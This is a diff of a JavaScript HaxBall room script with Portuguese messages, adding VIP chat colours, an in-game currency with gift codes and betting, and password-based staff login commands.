+                    cordochat[player.name] = minhascores[authArray[player.id]][msgArray[0] - 1]
+                    cordochatstorage.splice(0, cordochatstorage.length)
+                    cordochatstorage.push(cordochat)
+                    localStorage.setItem("cordochat", JSON.stringify(cordochatstorage));
+                }
+                room.sendAnnouncement(`Você colocou a cor ${minhascores[authArray[player.id]][msgArray[0] - 1]}`, player.id, 0x08FFF7, "bold", 0);
+
+            }
+            else {
+                room.sendAnnouncement(`Você digitou algo errado`, player.id, errorColor, "bold", 0);
+            }
+        } else {
+            room.sendAnnouncement(`Você não tem cor`, player.id, errorColor, "bold", 0);
+        }
+    }
+    else {
+        room.sendAnnouncement(`Você está digitando mais dados que o necessário.`, player.id, errorColor, "bold", 0);
+    }
+}
+
+
+function tirarCor(player) {
+    if (cordochat[player.name]) {
+        delete cordochat[player.name]
+        cordochatstorage.splice(0, cordochatstorage.length)
+        cordochatstorage.push(cordochat)
+        vips[authArray[player.id]].corChat = ''
+        vipsdb.splice(0, vipsdb.length)
+        vipsdb.push(vips)
+        localStorage.setItem("vips", JSON.stringify(vipsdb));
+        localStorage.setItem("cordochat", JSON.stringify(cordochatstorage));
+        room.sendAnnouncement(`Você retirou sua Cor do chat!`, player.id, 0x76FF03, "bold", 0);
+    }
+    else if (vips[authArray[player.id]].corChat != '') {
+        vips[authArray[player.id]].corChat = ''
+        vipsdb.splice(0, vipsdb.length)
+        vipsdb.push(vips)
+        localStorage.setItem("vips", JSON.stringify(vipsdb));
+        room.sendAnnouncement(`Você retirou sua Cor do chat!`, player.id, 0x76FF03, "bold", 0);
+    }
+
+    else {
+        room.sendAnnouncement(`Você não tem cor de chat`, player.id, errorColor, "bold", 0);
+    }
+}
+
+function infoVip(player) {
+    if (vips[authArray[player.id]]) {
+        if (infovip[player.name]) {
+            let dataInicial = new Date().getTime()
+            let diferencaEmMs = infovip[player.name]['tempo'] - dataInicial;
+            let diferencaEmDias = Math.floor(diferencaEmMs / (1000 * 60 * 60 * 24));
+            let restoEmMs = diferencaEmMs % (1000 * 60 * 60 * 24);
+            let diferencaEmHoras = Math.floor(restoEmMs / (1000 * 60 * 60));
+            room.sendAnnouncement(`∎∎∎∎ VIP ${vipnames[tipoVip]} ∎∎∎∎`, player.id, 0x76FF03, "bold", 0);
+            room.sendAnnouncement(`Faltam ${diferencaEmDias} Dias e ${diferencaEmHoras} Horas para seu VIP acabar.`, player.id, 0x76FF03, "bold", 0);
+        }
+        else { room.sendAnnouncement(`∎∎∎∎ Você possui VIP ${vipnames[tipoVip]} Vitalício ∎∎∎∎`, player.id, 0x2BEAFF, "bold", 0); }
+    }
+    else {
+        room.sendAnnouncement("Você não é VIP!", player.id, errorColor, "bold", 0);
+    }
+}
+
+
+function buscarIds(player, message) {
+    const msg = message.substr(4) // sem o !ids
+    if (msg.length != 0) {
+        const nick = msg.substr(1)
+        if (dadosjogadores[nick]) {
+            room.sendAnnouncement(`Nick: ${nick} ID do jogador ${dadosjogadores[nick]['id']}`, player.id, 0x76FF03, "bold", 0);
+
+        }
+        else {
+            room.sendAnnouncement("Não há jogadores com esse nick. Verifique a ortografia", player.id, errorColor, "bold", 0);
+        }
+
+    }
+    else {
+        let ids = room.getPlayerList();
+        ids.forEach(function (id) {
+            room.sendAnnouncement(`${id['name']}: ${id['id']}`, player.id, 0x76FF03, 'bold', 1);
+        });
+    }
+}
+
+function tirarVip(player, message) {
+    const nickid = message.substr(10) // sem o '!tirarvip '
+
+    if (nickid.length != 0) {
+        var pessoaEncontrada = procurar(nickid)
+        if (pessoaEncontrada) {
+            if (vips[pessoaEncontrada['auth']]) {
+
+                delete vips[pessoaEncontrada['auth']]
+                vipsdb.splice(0, vipsdb.length)
+                vipsdb.push(vips)
+                localStorage.setItem("vips", JSON.stringify(vipsdb));
+
+                if (infovip[pessoaEncontrada['nome']]) {
+                    delete infovip[pessoaEncontrada['nome']]
+                    infovipstorage.splice(0, infovipstorage.length)
+                    infovipstorage.push(infovip)
+                    localStorage.setItem("infovip", JSON.stringify(infovipstorage));
+                }
+
+                room.sendAnnouncement(`Você tirou o vip de ${pessoaEncontrada['nome']}`, player.id, 0x76FF03, 'bold', 1);
+                room.sendAnnouncement(`${player.name} tirou o sue VIP`, pessoaEncontrada['id'], errorColor, "bold", 0);
+            }
+            else {
+                room.sendAnnouncement("Este jogador não é vip!", player.id, errorColor, "bold", 0);
+            }
+        }
+        else {
+            room.sendAnnouncement("Não há jogadores com esse nick ou ID. Verifique o comando", player.id, errorColor, "bold", 0);
+        }
+
+    }
+    else {
+        room.sendAnnouncement("Comando errado. Digite !tirarvip <NICK OU ID>", player.id, errorColor, "bold", 0);
+    }
+}
+
+function procurar(nickid) {
+    let pessoaEncontrada = ''
+    for (let key in dadosjogadores) {
+        if (dadosjogadores[key]['nome'] == nickid || dadosjogadores[key]['id'] == nickid) {
+            pessoaEncontrada = dadosjogadores[key]
+        }
+    }
+
+    if (pessoaEncontrada != '') {
+        return pessoaEncontrada
+    }
+    else {
+        return false
+    }
+}
+
+
+function addAstros(player, quantidade) {
+    if (astros[player.name] != null) {
+        astros[player.name] = parseInt(astros[player.name]) + parseInt(quantidade);
+        astrosstorage.splice(0, astrosstorage.length);
+        astrosstorage.push(astros);
+        localStorage.setItem("astros", JSON.stringify(astrosstorage));
+    }
+
+}
+
+
+
+function subAstros(player, quantidade) {
+    if (astros[player.name] != null) {
+        astros[player.name] = parseInt(astros[player.name]) - parseInt(quantidade);
+        astrosstorage.splice(0, astrosstorage.length);
+        astrosstorage.push(astros);
+        localStorage.setItem("astros", JSON.stringify(astrosstorage));
+        room.sendAnnouncement(`- ${quantidade} Astros`, player.id, errorColor, "bold", 0);
+    }
+}
+
+function doarAstros(player, message) {
+
+    var id = message[1]
+    var valor = message[2]
+    const playerList = room.getPlayerList();
+    const found = playerList.find(element => element['id'] == id);
+    if (found) {
+        if (idp == player.id) {
+            room.sendAnnouncement("Você não pode enviar astros para si mesmo", player.id, Cor.Vermelho, "bold", 0);
+        }
+        else {
+            const findastros = astros.find(element => element[0] == player.name)
+            if (findastros) {
+                if (findastros[1] >= valor) {
+                    subAstros(player, valor)
+                    room.sendAnnouncement(`Você mandou ${valor} para ${found.name}`, player.id, Cor.Branco, "bold", 0)
+                    addAstros(found, valor)
+                    room.sendAnnouncement(`Você recebeu ${valor} Astros de ${player.name}`, found.id, Cor.Verde, "bold", 0)
+                    att = ["y"]
+                    localStorage.setItem("att", JSON.stringify(att));
+                }
+                else {
+                    room.sendAnnouncement("Você não tem Astros suficientes. !astros", player.id, Cor.Vermelho, "bold", 0);
+                }
+            }
+            else {
+                room.sendAnnouncement("ERRO, CONTATE UM ADMIN.", player.id, Cor.Vermelho, "bold", 0);
+            }
+
+        }
+
+    } else {
+        room.sendAnnouncement("ID não encontrado.", player.id, Cor.Vermelho, "bold", 0);
+    }
+}
+
+
+
+
+//##############################################################################################################################
+
+function showAstros(player) {
+    try {
+        room.sendAnnouncement(`Seu saldo atual é: ${astros[player.name]} Astros`, player.id, 0x76FF03, "bold", 0)
+    }
+    catch {
+        room.sendAnnouncement(`CONTATE UM ADMINISTRADOR, ERROR ASTROS#596`, player.id, errorColor, "bold", 0)
+
+    }
+}
+
+function mudarTag(player, message) {
+    if (tipoVip == 4) {
+        const tag = message.substr(5) // sem o '!tag '
+        tags[player.name] = tag
+        tagsstorage.splice(0, tagsstorage.length)
+        tagsstorage.push(tags)
+        localStorage.setItem("tags", JSON.stringify(tagsstorage));
+
+        room.sendAnnouncement(`Você colocou a tag ${tag}`, player.id, 0x76FF03, "bold", 0);
+        att = ["y"]
+        localStorage.setItem("att", JSON.stringify(att));
+    }
+    else {
+        room.sendAnnouncement(`Somente VIPS Galácticos podem mudar usar este comando.`,
+            player.id, errorColor, 'bold', HaxNotification.CHAT)
+
+    }
+}
+
+function tirarTag(player) {
+    if (tags[player.name]) {
+        delete tags[player.name]
+        tagsstorage.splice(0, tagsstorage.length)
+        tagsstorage.push(tags)
+        localStorage.setItem("tags", JSON.stringify(tagsstorage));
+        room.sendAnnouncement(`Você retirou sua Tag!`, player.id, 0x76FF03, "bold", 0);
+    }
+    else {
+        room.sendAnnouncement(`Você não tem tag.`,
+            player.id, errorColor, 'bold', HaxNotification.CHAT)
+
+    }
+}
+
+function codigo(player, message) {
+    const msg = message.split(/ +/);
+    if (msg.length == 3) {
+        codigo = msg[1]
+        const found = codigos.find(element => element[0] == codigo)
+        if (found) {
+            room.sendAnnouncement("Este código já existe.", player.id, errorColor, "bold", 0);
+            return;
+        }
+        quantidade = msg[2]
+        codigos.push([codigo, quantidade])
+        localStorage.setItem('codigos', JSON.stringify(codigos))
+        room.sendAnnouncement(`Código de ${quantidade} Astros cadrastado!`, player.id, 0x76FF03, "bold", 0);
+        att = ["y"]
+        localStorage.setItem("att", JSON.stringify(att));
+    }
+    else {
+        room.sendAnnouncement("Algo errado !codigos codigo quantidade", player.id, errorColor, "bold", 0);
+    }
+
+}
+
+function receber(player, message) {
+    const msg = message.split(/ +/)
+    if (msg.length == 2) {
+        var codigo = msg[1]
+        const found = codigos.find(element => element[0] == codigo)
+        if (found) {
+            codigos.splice(found, 1)
+            localStorage.setItem('codigos', JSON.stringify(codigos))
+            addAstros(player, found[1])
+            room.sendAnnouncement(`Você resgatou ${found[1]} Astros, !astros para ver.`, player.id, 0x76FF03, "bold", 0);
+            transacoesPlayers(urls.transacoes, {
+                content: "```" + roomName + "\n" + "💲Data dessa transação: " + `${dataehora()}` + "\n" +
+                    `💲${player.name} resgatou ${found[1]} Astros pelo código "${codigo}"` + "```"
+            })
+            att = ["y"]
+            localStorage.setItem("att", JSON.stringify(att));
+        }
+        else {
+            room.sendAnnouncement("Código não cadastrado.", player.id, errorColor, "bold", 0);
+        }
+    }
+    else {
+        room.sendAnnouncement("Algo errado !codigoastros quantidade", player.id, errorColor, "bold", 0);
+    }
+}
+
+function pegarAdmin(player) {
+    if (mods.includes(authArray[player.id]) || adminList.includes(authArray[player.id]) || gerente.includes(authArray[player.id]) || masterList.includes(authArray[player.id])) {
+        if (!player.admin) {
+            room.setPlayerAdmin(player.id, true)
+        }
+        else {
+            room.setPlayerAdmin(player.id, false)
+        }
+    }
+    else {
+        room.sendAnnouncement("Você não tem permissão.", player.id, errorColor, "bold", 0);
+    }
+
+
+}
+
+function apostar(player, message) {
+    if (teamRed.length < teamSize || teamBlue.length < teamSize) {
+        room.sendAnnouncement("Não há jogadores suficientes.", player.id, errorColor, "bold", 0);
+        return;
+    }
+    if (apostas == false) {
+        room.sendAnnouncement("As apostas são feitas do intervalo até 15 segundos iniciais de cada partida.", player.id, errorColor, "bold", 0);
+        return;
+    }
+    if (apostared[player.name] || apostablue[player.name]) {
+        room.sendAnnouncement("Você ja apostou nessa rodada", player.id, errorColor, "bold", 0);
+        return;
+    }
+    const aposta = message.split(/ +/).slice(1);
+    console.log(aposta)
+    console.log(aposta.length)
+    if (aposta.length == 0) {
+        room.sendAnnouncement("💰💰💰 Apostas VorteX 💰💰💰", player.id, announcementColor, "bold", 0);
+        room.sendAnnouncement("use !apostar time valor", player.id, announcementColor, "bold", 0);
+        room.sendAnnouncement("ex: !apostar red/blue valor", player.id, announcementColor, "bold", 0);
+        room.sendAnnouncement(`OD time RED: ${odred}`, player.id, blueColor, "bold", 0);
+        room.sendAnnouncement(`OD time BLUE: ${odblue}`, player.id, redColor, "bold", 0);
+    }
+    else if (aposta.length != 2) {
+        room.sendAnnouncement("Você digitou o comando errado, ex: !apostar red valor", player.id, errorColor, "bold", 0);
+        return;
+    }
+    else {
+        const time = aposta[0]
+        const valor = aposta[1]
+        if (time != 'red' && time != 'blue' && time != 'RED' && time != 'BLUE') {
+            room.sendAnnouncement("use red para time vermelho e blue para time azul", player.id, errorColor, "bold", 0);
+            return;
+        }
+        if (!parseInt(valor)) {
+            room.sendAnnouncement("digite um valor válido", player.id, errorColor, "bold", 0);
+            return;
+        }
+        if (parseInt(valor) > 0) {
+            pago = verificarPreco(player, parseInt(valor))
+            if (pago) {
+                if (time == 'RED' || time == 'red') {
+                    apostared[player.name] = {
+                        'od': odred,
+                        'valor': valor
+                    }
+                }
+                if (time == 'BLUE' || time == 'blue') {
+                    apostablue[player.name] = {
+                        'od': odblue,
+                        'valor': valor
+                    }
+                }
+                room.sendAnnouncement(`Você apostou ${valor} Astros no time ${time} aguarde o jogo acabar.`, player.id, announcementColor, "bold", 0);
+
+            }
+            else {
+                return;
+            }
+        }
+
+    }
+
+}
+
+function pagamentoAposta(winner) {
+    if (winner == Team.RED) {
+        for (let key in apostared) {
+            const premio = parseInt(apostared[key]['valor'] * apostared[key]['od'])
+            var playersonline = room.getPlayerList()
+            var jogador = playersonline.filter((p) => p.name == (key))
+            addAstros(jogador[0], premio)
+            room.sendAnnouncement(`Parabéns!! você recebeu ${premio} Astros como prêmio da sua aposta.`, jogador[0].id, errorColor, "bold", 0);
+        }
+    }
+    if (winner == Team.BLUE) {
+        room.sendAnnouncement("BLUE GANHOU", null, errorColor, "bold", 0);
+        for (let key in apostablue) {
+            const premio = parseInt(apostablue[key]['valor'] * apostablue[key]['od'])
+            var playersonline = room.getPlayerList()
+            var jogador = playersonline.filter((p) => p.name == (key))
+            addAstros(jogador[0], premio)
+            room.sendAnnouncement(`Parabéns!! você recebeu ${premio} Astros como prêmio da sua aposta.`, jogador[0].id, errorColor, "bold", 0);
+        }
+    }
+    apostared = {}
+    apostablue = {}
+}
+
+function autoLogin(player, message) {
+    const msg = message.split(/ +/).slice(1);
+    console.log(authArray[player.id])
+    if (!account[player.name]) {
+        room.sendAnnouncement("Registre-se primeiro para fazer o autologin!", player.id, errorColor, "bold", 0);
+        return;
+    }
+    if (msg.length != 0) {
+        room.sendAnnouncement("Digite apenas !autologin para logar automaticamente", player.id, errorColor, "bold", 0);
+    }
+    else {
+        if (autologin[player.name]) {
+            delete autologin[player.name]
+            autologinstorage.splice(0, autologinstorage.length)
+            autologinstorage.push(autologin)
+            localStorage.setItem('autologin', JSON.stringify(autologinstorage))
+
+            room.sendAnnouncement("Você retirou o autologin!", player.id, errorColor, "bold", 0);
+        }
+        else {
+            autologin[player.name] = {
+                'auth': authautologin,
+                'conn': connautologin
+            }
+            autologinstorage.splice(0, autologinstorage.length)
+            autologinstorage.push(autologin)
+            localStorage.setItem('autologin', JSON.stringify(autologinstorage))
+            room.sendAnnouncement("Você ativou o autologin.", player.id, errorColor, "bold", 0);
+        }
+    }
+}
+
+
+function leaveCommand(player, message) {
+    room.kickPlayer(player.id, 'Tremeu!!! kk', false);
+
+}
+
+function updateOD() {
+    let pontosblue = 0;
+    let pontosred = 0;
+
+    for (let key in teamBlue) {
+        try {
+            let nome = teamBlue[key].name;
+            let pontos = statsplayer[nome].pontos;
+            pontosblue += pontos;
+            console.log(nome, pontos, pontosblue);
+        }
+        catch { }
+    }
+
+    for (let key in teamRed) {
+        try {
+            let nome = teamRed[key].name;
+            let pontos = statsplayer[nome].pontos;
+            pontosred += pontos;
+            console.log(nome, pontos, pontosred);
+        }
+        catch { }
+    }
+
+    function calculateOD(consecutiveWins, redPoints, bluePoints) {
+        const maxOD = 1.8;
+        const minOD = 1.1;
+        const winFactor = 0.9;
+        const pointFactor = 0.1;
+
+        const redWinProb = Math.pow(winFactor, consecutiveWins) * (redPoints / (redPoints + bluePoints));
+        const blueWinProb = Math.pow(winFactor, consecutiveWins) * (bluePoints / (redPoints + bluePoints));
+
+        console.log("redWinProb:", redWinProb, "blueWinProb:", blueWinProb);
+
+        let redOD = (1 / redWinProb) * pointFactor;
+        let blueOD = (1 / blueWinProb) * pointFactor;
+
+        console.log("redOD before cap:", redOD, "blueOD before cap:", blueOD);
+
+        if (redOD > maxOD) {
+            redOD = maxOD;
+        }
+
+        if (blueOD > maxOD) {
+            blueOD = maxOD;
+        }
+
+        if (redOD < minOD) {
+            redOD = minOD;
+        }
+
+        if (blueOD < minOD) {
+            blueOD = minOD;
+        }
+
+        console.log("redOD after cap:", redOD, "blueOD after cap:", blueOD);
+
+        return [redOD, blueOD];
+    }
+
+
+    // Exemplo com 0 wins, 20 pontos red e 0 pontos blue
+    var odds = calculateOD(streak, pontosred, pontosblue);
+    odred = odds[0];
+    odblue = odds[1];
+
+}
+
+function controleAposta() {
+    if (teamRed.length >= teamSize && teamBlue.length >= teamSize) {
+        if (parseInt(room.getScores().time) < 15 && apostas == false && gameState == State.PLAY) {
+            apostas = true
+            room.sendAnnouncement("[💰] Façam suas apostas! [💰]", null, 0xD4CE22, 'bold');
+            room.sendAnnouncement("[💰] Após iniciada a partida, você tem 15 segundos para apostar [💰]", null, 0xD4CE22, 'bold');
+            updateOD()
+        }
+        if (parseInt(room.getScores().time) > 15 && apostas == true && gameState == State.PLAY) {
+            apostas = false
+            room.sendAnnouncement("[💰] Apostas encerradas! [💰]", null, 0xD4CE22, 'bold');
+        }
+    }
+    else {
+        if (apostas == true) {
+            apostas = false
+        }
+    }
+}
 function helpCommand(player, message) {
     var msgArray = message.split(/ +/).slice(1);
     if (msgArray.length == 0) {
         var commandString = '[📄] Comandos:';
         for (const [key, value] of Object.entries(commands)) {
-            if (!['selecoes', 'brasileiros', 'outros', 'estrangeiros', 'especiais'].includes(key)) {
+            if (!['selecoes', 'brasileiros', 'outros', 'estrangeiros', 'vipuni', 'uniespeciais'].includes(key)) {
                 if (value.desc && value.roles == Role.PLAYER) commandString += ` !${key},`;
             }
         }
@@ -7235,26 +3816,39 @@ function helpCommand(player, message) {
         commandString = commandString.substring(0, commandString.length - 1) + '.\n';
         if (tipoVip || player.admin) {
             if (tipoVip == 1) {
-                commandString += `Comandos VIP: !p, !corchat <CódigoHexadecimalDaCor> ex: FFFF00` + '.\n';
+                commandString += `Comandos VIP: !p, !setpro` + '.\n';
             } else if (tipoVip == 2) {
-                commandString += `Comandos VIP: !p, !corchat <CódigoHexadecimalDaCor> ex: FFFF00, !setpro, !setuni, !entrada, !furar` + '.\n';
-            } else {
+                commandString += `Comandos VIP: !p, !setpro, !setuni, !entrada, !furar` + '.\n';
+            }
+            else if (tipoVip == 3) {
+                commandString += `Comandos VIP: !p, !setpro, !setuni, !entrada, !furar, !corchat <CódigoHexadecimalDaCor> ex: FFFF00` + '.\n';
+            }
+            else {
                 commandString += `Comandos VIP: !p, !corchat <CódigoHexadecimalDaCor> ex: FFFF00, !setpro, !setuni, !entrada, !furar, !avatar` + '.\n';
             }
         }
-        if (getRole(player) >= Role.ADMIN_TEMP) {
-            commandString += `Comandos Admin:`;
+        if (getRole(player) >= Role.MOD) {
+            commandString += `Comandos Mod:`;
             for (const [key, value] of Object.entries(commands)) {
-                if (value.desc && value.roles == Role.ADMIN_TEMP) commandString += ` !${key},`;
+                if (value.desc && value.roles == Role.MOD) commandString += ` !${key},`;
             }
             if (commandString.slice(commandString.length - 1) == ':')
                 commandString += ` None,`;
             commandString = commandString.substring(0, commandString.length - 1) + '.\n';
         }
-        if (getRole(player) >= Role.MOD) {
-            commandString += `Comandos Moderador:`;
+        if (getRole(player) >= Role.ADMIN) {
+            commandString += `Comandos Admin:`;
             for (const [key, value] of Object.entries(commands)) {
-                if (value.desc && value.roles == Role.MOD) commandString += ` !${key},`;
+                if (value.desc && value.roles == Role.ADMIN) commandString += ` !${key},`;
+            }
+            if (commandString.slice(commandString.length - 1) == ':')
+                commandString += ` None,`;
+            commandString = commandString.substring(0, commandString.length - 1) + '.\n';
+        }
+        if (getRole(player) >= Role.GERENTE) {
+            commandString += `Comandos Gerente:`;
+            for (const [key, value] of Object.entries(commands)) {
+                if (value.desc && value.roles == Role.GERENTE) commandString += ` !${key},`;
             }
             if (commandString.slice(commandString.length - 1) == ':')
                 commandString += ` None,`;
@@ -7288,7 +3882,7 @@ function helpCommand(player, message) {
             );
         else
             room.sendAnnouncement(
-                `O comando sobre o qual tu tentou obter informações não existe. Para verificar todos os comandos disponíveis, digite !ajuda`,
+                `O comando sobre o qual Você tentou obter informações não existe. Para verificar todos os comandos disponíveis, digite !ajuda`,
                 player.id,
                 errorColor,
                 'bold',
@@ -7299,20 +3893,32 @@ function helpCommand(player, message) {
 
 function globalStatsCommandMe(player, message) {
     var stats = new HaxStatistics(player.name)
-    if (localStorage.getItem(authArray[player.id])) {
-        stats = JSON.parse(localStorage.getItem(authArray[player.id]))
+    if (statsplayer[player.name]) {
+        stats = statsplayer[player.name]
     }
     var statsString = printPlayerStatsMe(stats);
-    room.sendAnnouncement(`${statsString}`, player.id, infoColor, 'bold', HaxNotification.CHAT);
+    room.sendAnnouncement(
+        statsString,
+        player.id,
+        infoColor,
+        'bold',
+        HaxNotification.CHAT
+    );
 }
 
 function globalStatsCommand(player, message) {
     var stats = new HaxStatistics(player.name)
-    if (localStorage.getItem(authArray[player.id])) {
-        stats = JSON.parse(localStorage.getItem(authArray[player.id]))
+    if (statsplayer[player.name]) {
+        stats = statsplayer[player.name]
     }
     var statsString = printPlayerStats(stats);
-    room.sendAnnouncement(`${statsString}`, null, infoColor, 'bold', HaxNotification.CHAT);
+    room.sendAnnouncement(
+        statsString,
+        null,
+        infoColor,
+        'bold',
+        HaxNotification.CHAT
+    );
 }
 
 function renameCommand(player, message) {
@@ -7327,23 +3933,24 @@ function renameCommand(player, message) {
         return false
     }
     var msgArray = message.split(/ +/).slice(1);
-    if (localStorage.getItem(authArray[player.id])) {
-        var stats = JSON.parse(localStorage.getItem(authArray[player.id]));
+    if (statsplayer[player.name]) {
+        var stats = statsplayer[player.name];
         if (msgArray.length == 0) {
             stats.playerName = player.name;
         } else {
             stats.playerName = msgArray.join(' ');
         }
-        localStorage.setItem(authArray[player.id], JSON.stringify(stats));
+        statsplaye[player.name] = stats
+        localStorage.setItem('statsplayer', JSON.stringify(statsplayer));
         room.sendAnnouncement(
-            `Tu renomeou com sucesso para ${stats.playerName} !`,
+            `Você renomeou com sucesso para ${stats.playerName} !`,
             player.id,
             successColor,
             'bold',
             HaxNotification.CHAT
         );
     } else {
-        room.sendAnnouncement(`Tu ainda não jogou um jogo nesta sala!`,
+        room.sendAnnouncement(`Você ainda não jogou um jogo nesta sala!`,
             player.id, errorColor, 'bold', HaxNotification.CHAT
         );
     }
@@ -7378,7 +3985,7 @@ function afkCommand(player, message) {
         } else {
             if (AFKCooldownSet.has(player.id)) {
                 room.sendAnnouncement(
-                    `Tu só pode ficar AFK a cada ${AFKCooldown} minutos. Não abuse do comando!`,
+                    `Você só pode ficar AFK a cada ${AFKCooldown} minutos. Não abuse do comando!`,
                     player.id, errorColor, 'bold', HaxNotification.CHAT
                 );
             } else {
@@ -7423,7 +4030,7 @@ function afkCommand(player, message) {
         }
     } else {
         room.sendAnnouncement(
-            `Tu não pode ficar AFK enquanto estiver em uma equipe!`,
+            `Você não pode ficar AFK enquanto estiver em uma equipe!`,
             player.id,
             errorColor,
             'bold',
@@ -7457,10 +4064,10 @@ function masterCommand(player, message) {
     if (msgArray[0] == masterPassword) {
         if (!masterList.includes(authArray[player.id])) {
             room.setPlayerAdmin(player.id, true);
-            adminList = adminList.filter((a) => a[0] != authArray[player.id]);
+            masterList = masterList.filter((a) => a[0] != authArray[player.id]);
             masterList.push(authArray[player.id]);
             room.sendAnnouncement(
-                `${player.name} agora é o novo mestre!`,
+                `${player.name} agora é o novo Fundador!`,
                 null,
                 announcementColor,
                 'bold',
@@ -7468,7 +4075,46 @@ function masterCommand(player, message) {
             );
         } else {
             room.sendAnnouncement(
-                `Tu já é um mestre!`,
+                `Você já está logado como Fundador!`,
+                player.id,
+                errorColor,
+                'bold',
+                HaxNotification.CHAT
+            );
+        }
+    }
+}
+function fundadorCommand(player, message) {
+    var msgArray = message.split(/ +/).slice(1);
+    if (msgArray[0] == donoPassword) {
+        if (!donoList.includes(authArray[player.id])) {
+            room.setPlayerAdmin(player.id, true);
+            donoList = donoList.filter((a) => a[0] != authArray[player.id]);
+            donoList.push(authArray[player.id]);
+            room.sendAnnouncement(`${player.name} agora é o novo Dono!`, null, announcementColor, 'bold', HaxNotification.CHAT);
+        } else {
+            room.sendAnnouncement(`Você já está logado como Dono!`, player.id, errorColor, 'bold', HaxNotification.CHAT);
+        }
+    }
+}
+
+function diretorCommand(player, message) {
+    var msgArray = message.split(/ +/).slice(1);
+    if (msgArray[0] == diretorPassword) {
+        if (!diretores.includes(authArray[player.id])) {
+            room.setPlayerAdmin(player.id, true);
+            diretores = diretores.filter((a) => a[0] != authArray[player.id]);
+            diretores.push(authArray[player.id]);
+            room.sendAnnouncement(
+                `${player.name} agora é o novo Diretor!`,
+                null,
+                announcementColor,
+                'bold',
+                HaxNotification.CHAT
+            );
+        } else {
+            room.sendAnnouncement(
+                `Você já está logado como Diretor!`,
                 player.id,
                 errorColor,
                 'bold',
@@ -7478,27 +4124,44 @@ function masterCommand(player, message) {
     }
 }
 
+function donoCommand(player, message) {
+    var msgArray = message.split(/ +/).slice(1);
+    if (msgArray[0] == donoPassword) {
+        if (!gerentes.includes(authArray[player.id])) {
+            room.setPlayerAdmin(player.id, true);
+            gerentes = gerentes.filter((a) => a[0] != authArray[player.id]);
+            gerentes.push(authArray[player.id]);
+            room.sendAnnouncement(
+                `${player.name} agora é o novo Gerente!`,
+                null,
+                announcementColor,
+                'bold',
+                HaxNotification.CHAT
+            );
+        } else {
+            room.sendAnnouncement(
+                `Você já está logado como Gerente!`,
+                player.id,
+                errorColor,
+                'bold',
+                HaxNotification.CHAT
+            );
+        }
+    }
+}
+
+
 function adminCommand(player, message) {
     var msgArray = message.split(/ +/).slice(1);
     if (parseInt(msgArray[0]) == adminPassword) {
         if (!adminList.includes(authArray[player.id])) {
-            room.setPlayerAdmin(player.id, true);
-            if (masterList.includes(authArray[player.id])) {
-                room.sendAnnouncement(
-                    `${player.name} Tu já é um mestre!`,
-                    player.id, errorColor, 'bold', HaxNotification.CHAT)
-                return false
-            }
-            adminList.push([authArray[player.id], player.name]);
-            adminPassword = getRandomInt2(10000, 99999)
-            room.sendAnnouncement(
-                `${player.name} agora é o novo admin!`,
-                null, announcementColor, 'bold', HaxNotification.CHAT)
+            room.setPlayerAdmin(player.id, true)
+            adminList.push(authArray[player.id]);
+            adminPassword = getRandomInt2(10000, 799999)
+            room.sendAnnouncement(`${player.name} Logou como Administrador!`, null, announcementColor, 'bold', HaxNotification.CHAT)
             sendPasswordStaff(player.name)
         } else {
-            room.sendAnnouncement(
-                `Tu já é um admin!`,
-                player.id, errorColor, 'bold', HaxNotification.CHAT)
+            room.sendAnnouncement(`Você já é um Administrador!`, player.id, errorColor, 'bold', HaxNotification.CHAT)
         }
     }
 }
@@ -7528,7 +4191,7 @@ function vipCommand(player, message) {
             player.id, errorColor, 'bold', HaxNotification.CHAT)
         return false
     }
-    setVipCommand(player, `!setvip #${player.id} ${numVip}`)
+    setVipCommand(player, `!setvip ${player.id} ${numVip}`)
 }
 
 
@@ -7573,8 +4236,7 @@ function stadiumCommand(player, message) {
 function muteCommand(player, message) {
     var msgArray = message.split(/ +/).slice(1);
     if (msgArray.length > 0) {
-        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
-            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
+        if (msgArray[0].length > 0) {
             if (room.getPlayer(parseInt(msgArray[0])) != null) {
                 var playerMute = room.getPlayer(parseInt(msgArray[0]));
                 var minutesMute = muteDuration;
@@ -7593,7 +4255,7 @@ function muteCommand(player, message) {
                     );
                 } else {
                     room.sendAnnouncement(
-                        `Tu não pode silenciar um administrador.`,
+                        `Você não pode silenciar um administrador.`,
                         player.id,
                         errorColor,
                         'bold',
@@ -7602,13 +4264,13 @@ function muteCommand(player, message) {
                 }
             } else {
                 room.sendAnnouncement(
-                    `Não há jogador com tal ID na sala. Digite "!ajuda mute" para obter mais informações.`,
+                    `Não há jogador com tal ID na sala. Digite "!ajuda mutar" para obter mais informações.`,
                     player.id, errorColor, 'bold', HaxNotification.CHAT
                 );
             }
         } else {
             room.sendAnnouncement(
-                `Formato incorreto de argumento. Digite "!ajuda mute" para obter mais informações.`,
+                `Formato incorreto de argumento. Digite "!ajuda mutar" para obter mais informações.`,
                 player.id,
                 errorColor,
                 'bold',
@@ -7617,7 +4279,7 @@ function muteCommand(player, message) {
         }
     } else {
         room.sendAnnouncement(
-            `Número incorreto de argumentos. Digite "!ajuda mute" para obter mais informações.`,
+            `Número incorreto de argumentos. Digite "!ajuda mutar" para obter mais informações.`,
             player.id,
             errorColor,
             'bold',
@@ -7629,8 +4291,7 @@ function muteCommand(player, message) {
 function unmuteCommand(player, message) {
     var msgArray = message.split(/ +/).slice(1);
     if (msgArray.length > 0) {
-        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
-            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
+        if (msgArray[0].length > 0) {
             if (room.getPlayer(parseInt(msgArray[0])) != null) {
                 var playerUnmute = room.getPlayer(parseInt(msgArray[0]));
                 if (muteArray.getByPlayerId(playerUnmute.id) != null) {
@@ -7713,8 +4374,18 @@ function mostraUnisEstrangeiros(player, message) {
     room.sendAnnouncement(estrangeiros, player.id, infoColor, 'bold', 1)
     return false
 }
-function mostraUnisEspeciais(player, message) {
-    room.sendAnnouncement(especiais, player.id, infoColor, 'bold', 1)
+function mostraUnisvipuni(player, message) {
+    room.sendAnnouncement(vipuni, player.id, infoColor, 'bold', 1)
+    return false
+}
+function mostraUnisvipuniEspeciais(player, message) {
+    var vipNames = Object.keys(uniVIP2).join(', ');
+
+    room.sendAnnouncement(`Uniformes Vips Especiais: ${vipNames}`, player.id, infoColor, 'bold', 1)
+    return false;
+}
+function mostraUnisNovos(player, message) {
+    room.sendAnnouncement(novos, player.id, infoColor, 'bold', 1)
     return false
 }
 function mostraProvocacoes(player, message) {
@@ -7722,14 +4393,17 @@ function mostraProvocacoes(player, message) {
